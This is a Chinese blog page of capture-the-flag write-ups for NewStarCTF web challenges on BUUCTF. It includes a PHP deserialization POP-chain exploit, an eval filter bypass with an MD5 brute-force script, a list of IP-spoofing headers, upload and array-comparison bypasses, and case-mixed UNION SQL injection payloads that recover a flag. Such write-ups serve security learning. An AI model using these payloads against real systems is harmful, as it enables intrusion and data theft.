<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>buu刷题 | ZmRzのblog</title><meta name="author" content="ZmRz"><meta name="copyright" content="ZmRz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="rgba(255, 255, 255, 0.6)"><meta name="description" content="[NewStarCTF 公开赛赛道]UnserializeOne123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888">
<meta property="og:type" content="article">
<meta property="og:title" content="buu刷题">
<meta property="og:url" content="https://www.zmrz.xyz/2025/07/10/buu%E5%88%B7%E9%A2%98/index.html">
<meta property="og:site_name" content="ZmRzのblog">
<meta property="og:description" content="[NewStarCTF 公开赛赛道]UnserializeOne123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.zmrz.xyz/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%89%91-%E5%8F%A4%E9%A3%8E-%E5%BE%A1%E5%89%91%E9%A9%AD%E9%BE%99.png">
<meta property="article:published_time" content="2025-07-10T11:51:44.000Z">
<meta property="article:modified_time" content="2025-07-10T12:17:31.205Z">
<meta property="article:author" content="ZmRz">
<meta property="article:tag" content="热爱">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.zmrz.xyz/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%89%91-%E5%8F%A4%E9%A3%8E-%E5%BE%A1%E5%89%91%E9%A9%AD%E9%BE%99.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "buu刷题",
  "url": "https://www.zmrz.xyz/2025/07/10/buu%E5%88%B7%E9%A2%98/",
  "image": "https://www.zmrz.xyz/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%89%91-%E5%8F%A4%E9%A3%8E-%E5%BE%A1%E5%89%91%E9%A9%AD%E9%BE%99.png",
  "datePublished": "2025-07-10T11:51:44.000Z",
  "dateModified": "2025-07-10T12:17:31.205Z",
  "author": [
    {
      "@type": "Person",
      "name": "ZmRz",
      "url": "https://www.zmrz.xyz"
    }
  ]
}</script><link rel="shortcut icon" href="/images/wallpar%20(1).png"><link rel="canonical" href="https://www.zmrz.xyz/2025/07/10/buu%E5%88%B7%E9%A2%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'rgba(13, 13, 13, 0.6)')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'rgba(255, 255, 255, 0.6)')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'buu刷题',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/footer.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/images/123.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%89%91-%E5%8F%A4%E9%A3%8E-%E5%BE%A1%E5%89%91%E9%A9%AD%E9%BE%99.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ZmRzのblog</span></a><a class="nav-page-title" href="/"><span class="site-name">buu刷题</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">buu刷题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-10T11:51:44.000Z" title="发表于 2025-07-10 19:51:44">2025-07-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-10T12:17:31.205Z" title="更新于 2025-07-10 20:17:31">2025-07-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%88%B7%E9%A2%98/">刷题</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="NewStarCTF-公开赛赛道-UnserializeOne"><a href="#NewStarCTF-公开赛赛道-UnserializeOne" class="headerlink" title="[NewStarCTF 公开赛赛道]UnserializeOne"></a>[NewStarCTF 公开赛赛道]UnserializeOne</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">\<span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">php反序列化题目</span><br><span class="line"></span><br><span class="line">pop链构造destruct----》call---&gt;<span class="keyword">clone</span>----&gt;tostring---&gt;invoke</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$res</span> = <span class="keyword">new</span> <span class="title class_">Start</span>;</span><br><span class="line"><span class="variable">$res</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Sec</span>;<span class="comment">//第一条链</span></span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;obj = <span class="keyword">new</span> <span class="title class_">Easy</span>;<span class="comment">//第二条链</span></span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span>=<span class="keyword">new</span> eeee;<span class="comment">//第三条链</span></span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span>-&gt;obj=<span class="keyword">new</span> <span class="title class_">Start</span>;<span class="comment">//第四条链</span></span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span>-&gt;obj-&gt;func=<span class="keyword">new</span> <span class="title class_">Sec</span>;<span class="comment">//第五条链</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="NewStarCTF-2023-公开赛道-R-C-E"><a href="#NewStarCTF-2023-公开赛道-R-C-E" class="headerlink" title="[NewStarCTF 2023 公开赛道]R!C!E!"></a>[NewStarCTF 2023 公开赛道]R!C!E!</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_POST[&#x27;password&#x27;])&amp;&amp;isset($_POST[&#x27;e_v.a.l&#x27;]))&#123;</span><br><span class="line">  $password=md5($_POST[&#x27;password&#x27;]);</span><br><span class="line">  $code=$_POST[&#x27;e_v.a.l&#x27;];</span><br><span class="line">  if(substr($password,0,6)===&quot;c4d038&quot;)&#123;</span><br><span class="line">    if(!preg_match(&quot;/flag|system|pass|cat|ls/i&quot;,$code))&#123;</span><br><span class="line">      eval($code);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>对参数password进行md5处理，检测其前6位是否是所需要的值，之后对输入的命令进行了过滤</p>
<p>还有”-“被解析为” .”iscc碰见过</p>
<p>使用[即可(post传参特性)</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704101644293.png" class="" title="image-20250704101644293">

<p>password&#x3D;USriMT35mYgUlenwusWV&amp;e[v.a.l&#x3D;echo(<code>more /fl\ag</code>);</p>
<p>exp</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md5</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        md5 = hashlib.md5(rnds.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> md5.hexdigest()[start: start+str_len] == substr:</span><br><span class="line">            <span class="built_in">print</span> (rnds)</span><br><span class="line">            stop_event.<span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = <span class="string">&quot;c4d038&quot;</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, <span class="number">0</span>))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure>

<h1 id="NewStarCTF-2023-公开赛道-EasyLogin"><a href="#NewStarCTF-2023-公开赛道-EasyLogin" class="headerlink" title="[NewStarCTF 2023 公开赛道]EasyLogin"></a>[NewStarCTF 2023 公开赛道]EasyLogin</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704104214430.png" class="" title="image-20250704104214430">

<p>是个登录系统抓包爆破，密码使用md5进行加密</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704104249692.png" class="" title="image-20250704104249692">

<p>账户admin密码000000</p>
<p>登录抓包</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704104321400.png" class="" title="image-20250704104321400">登录进入界面得到flag

<h1 id="NewStarCTF-2023-公开赛道-Begin-of-HTTP"><a href="#NewStarCTF-2023-公开赛道-Begin-of-HTTP" class="headerlink" title="[NewStarCTF 2023 公开赛道]Begin of HTTP"></a>[NewStarCTF 2023 公开赛道]Begin of HTTP</h1><p>根据提示抓包一步一步进行即可</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704110328804.png" class="" title="image-20250704110328804">

<p>最后一步修改本地ip地址发现常规X-Forwarded-For: 127.0.0.1无法成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> 1 Client-IP:127.0.0.1</span><br><span class="line"> 2 Forwarded-For-Ip: 127.0.0.1</span><br><span class="line"> 3 Forwarded-For: 127.0.0.1</span><br><span class="line"> 4 Forwarded-For: localhost</span><br><span class="line"> 5 Forwarded:127.0.0.1</span><br><span class="line"> 6 Forwarded: localhost</span><br><span class="line"> 7 True-Client-IP:127.0.0.1</span><br><span class="line"> 8 X-Client-IP: 127.0.0.1</span><br><span class="line"> 9 X-Custom-IP-Authorization : 127.0.0.1</span><br><span class="line">10 X-Forward-For: 127.0.0.1</span><br><span class="line">11 X-Forward: 127.0.0.1</span><br><span class="line">12 X-Forward: localhost</span><br><span class="line">13 X-Forwarded-By:127.0.0.1</span><br><span class="line">14 X-Forwarded-By: localhost</span><br><span class="line">15 X-Forwarded-For-Original: 127.0.0.1</span><br><span class="line">16 X-Forwarded-For-original: localhost</span><br><span class="line">17 X-Forwarded-For: 127.0.0.1</span><br><span class="line">18 X-Forwarded-For: localhost</span><br><span class="line">19 X-Forwarded-Server: 127.0.0.1</span><br><span class="line">20 X-Forwarded-Server: localhost</span><br><span class="line">21 X-Forwarded: 127.0.0.1</span><br><span class="line">22 X-Forwarded: localhost</span><br><span class="line">23 X-Forwared-Host: 127.0.0.1</span><br><span class="line">24 X-Forwared-Host: localhost</span><br><span class="line">25 X-Host: 127.0.0.1</span><br><span class="line">26 X-Host: localhost</span><br><span class="line">27 X-HTTP-Host-Override : 127.0.0.1</span><br><span class="line">28 X-Originating-IP: 127.0.0.1</span><br><span class="line">29 X-Real-IP: 127.0.0.1</span><br><span class="line">30 X-Remote-Addr: 127.0.0.1</span><br><span class="line">31 X-Remote-Addr : localhost</span><br><span class="line">32 X-Remote-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>一个一个实验发现 X-Real-IP: 127.0.0.1可以</p>
<h1 id="NewStarCTF-2023-公开赛道-Begin-of-Upload"><a href="#NewStarCTF-2023-公开赛道-Begin-of-Upload" class="headerlink" title="[NewStarCTF 2023 公开赛道]Begin of Upload"></a>[NewStarCTF 2023 公开赛道]Begin of Upload</h1><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>文件上传，先尝试几个文件上传图片后抓包更改后缀发现直接能传入</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704111246140.png" class="" title="image-20250704111246140">

<h1 id="NewStarCTF-2023-公开赛道-Begin-of-PHP"><a href="#NewStarCTF-2023-公开赛道-Begin-of-PHP" class="headerlink" title="[NewStarCTF 2023 公开赛道]Begin of PHP"></a>[NewStarCTF 2023 公开赛道]Begin of PHP</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704113457445.png" class="" title="image-20250704113457445">

<p>全部使用数组绕过即可</p>
<p>key1[]&#x3D;1<br>&amp;key2[]&#x3D;2<br>&amp;key4[]&#x3D;1<br>&amp;key5[]&#x3D;2024</p>
<p>key3[]&#x3D;1&amp;flag5[]&#x3D;.</p>
<h1 id="NewStarCTF-2023-公开赛道-泄漏的秘密"><a href="#NewStarCTF-2023-公开赛道-泄漏的秘密" class="headerlink" title="[NewStarCTF 2023 公开赛道]泄漏的秘密"></a>[NewStarCTF 2023 公开赛道]泄漏的秘密</h1><p>robots.txt存在一半flag，扫出网站备份<a target="_blank" rel="noopener" href="http://www.zip得到另一半/">www.zip得到另一半</a></p>
<h1 id="NewStarCTF-2023-公开赛道-ez-sql"><a href="#NewStarCTF-2023-公开赛道-ez-sql" class="headerlink" title="[NewStarCTF 2023 公开赛道]ez_sql"></a>[NewStarCTF 2023 公开赛道]ez_sql</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704143339398.png" class="" title="image-20250704143339398">

<p>测试存在waf对and or等关键字都进行了过滤 使用大小写绕过即可</p>
<p>?id&#x3D;-1’ UniOn seLect database(),2,3,4,GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D; ‘ctf’–+</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704144113407.png" class="" title="image-20250704144113407">

<p><a target="_blank" rel="noopener" href="http://ff3d18d2-74a4-405a-a674-099ca58fd1b1.node5.buuoj.cn:81/?id=-1">http://ff3d18d2-74a4-405a-a674-099ca58fd1b1.node5.buuoj.cn:81/?id=-1</a>‘ UniOn seLect database(),2,3,4,flag FROM here_is_flag –+</p>
<p>flag{f1cb957b-fa7d-4e98-b769-4b9c9f60f0e9}</p>
